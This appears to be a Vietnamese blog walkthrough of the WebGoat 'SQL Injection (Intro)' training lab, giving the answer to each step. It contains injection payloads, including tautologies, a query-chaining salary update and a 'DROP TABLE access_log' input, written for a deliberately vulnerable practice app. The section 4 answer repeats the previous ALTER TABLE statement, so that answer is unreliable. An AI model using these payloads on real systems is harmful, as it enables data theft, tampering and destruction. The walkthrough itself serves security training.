---
title: "(A3) SQL Injection - SQL Injection (Intro) - Webgoat"
tag: "webgoat"
subtitle: " 🐐
  Bài viết này mình sẽ hướng dẫn các bạn làm phần (A3) SQL Injection - SQL Injection (Intro)"
date: "20-3-2024"
id: "10"
---

- **SQL Injection** là một kỹ thuật tấn công phổ biến trong lĩnh vực bảo mật web, mà kẻ tấn công sử dụng để thực hiện các thao tác không hợp lệ trên cơ sở dữ liệu của ứng dụng web thông qua việc chèn các câu lệnh SQL bất hợp pháp vào các trường nhập liệu của biểu mẫu web hoặc các tham số truy vấn URL.

- Khi một ứng dụng web không kiểm tra và xử lý đầu vào của người dùng một cách an toàn, kẻ tấn công có thể chèn các câu lệnh SQL như SELECT, INSERT, UPDATE hoặc DELETE vào các trường nhập liệu. Khi thực thi, các câu lệnh này có thể gây ra các hậu quả nguy hiểm như thu thập thông tin nhạy cảm, sửa đổi hoặc xóa dữ liệu trong cơ sở dữ liệu, hoặc thậm chí kiểm soát hoàn toàn ứng dụng web.

- Để phòng tránh SQL Injection, các nhà phát triển cần áp dụng các biện pháp bảo mật như sử dụng câu lệnh tham số hóa, sử dụng các API truy cập cơ sở dữ liệu an toàn, kiểm tra và xử lý đầu vào của người dùng một cách cẩn thận, và thường xuyên kiểm tra và cập nhật bảo mật cho ứng dụng web.

## 1. What is SQL?

- Đề bài yêu cầu lấy department của nhân viên Bob Franco
- Nhập câu lệnh SQL sau và nhấn submit là xong:

```json
SELECT department FROM employees WHERE USERID = 96134
```

![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1710936742/WebGoat/H37_ehbiz5.png)

## 2. Data Manipulation Language (DML)

- Đề bài yêu cầu thay đổi department của Tobi thành 'Sales'
- Nhập câu lệnh sau và nhấn submit là xong:

```json
UPDATE employees SET department = 'Sales' WHERE USERID = 89762
```

![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1710936742/WebGoat/H38_gbcfc5.png)

## 3. Data Definition Language (DDL)

- Đề bài yêu câu thêm một trường "phone" vào bảng "employees"
- Nhập câu lệnh sau và nhấn submit là xong:

```json
ALTER TABLE employees ADD phone varchar(20)
```

![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1710936743/WebGoat/H39_eaaird.png)

## 4. Data Control Language (DCL)

- Đề bài yêu cầu cấp quyền cho bảng `grant_rights ` đến user là `unauthorized_user`:
- Nhập câu lệnh sau và nhấn submit là xong:

  ```json
  ALTER TABLE employees ADD phone varchar(20)
  ```

  ![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1710936743/WebGoat/H40_qj3x9g.png)

## 5. Try It! String SQL injection

- Đề bài yêu cầu hoàn thành câu lệnh SQL
- Ta lần lượt chọn các ô là: `Smith' `, `OR` và ` '1' = '1`. Nhấn Get Account Info
  ![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1710936744/WebGoat/H41_xdzzbm.png)

## 6. Try It! Numeric SQL injection

- Đề bài yêu cầu lấy tất cả thông tin trong bảng users
- Ta lần lượt điền: Login_Count: `0` và User_Id:`6 OR TRUE`. Nhấn Get Account Info
  ![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1710936744/WebGoat/H42_wm0w84.png)

## 7. Compromising confidentiality with String SQL injection

- Đề bài yêu cầu lấy tất cả dữ liệu ` employees`
- Ta điền: Employee Name: `TAN' OR TRUE --`. Nhấn Get department
  ![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1710936749/WebGoat/H43_ndr5p5.png)

## 8. Compromising Integrity with Query chaining

- Lần lượt nhập: Employee Name: `Smith` và Authentication `TAN: 3SL99A'; UPDATE employees SET salary = 10000000 WHERE auth_tan = '3SL99A'--` . Nhấn Get department:
  ![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1710936751/WebGoat/H44_n7yzcj.png)

## 9. Compromising Availability

- Ta nhập lệnh: `UPDATE'; DROP TABLE access_log --`. Và nhấn Search logs
  ![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1710936750/WebGoat/H45_aufcrd.png)

## Tham khảo:

1.  Đỗ Tuấn: [Link](https://www.youtube.com/watch?v=7WecQCiCeSE "Link")
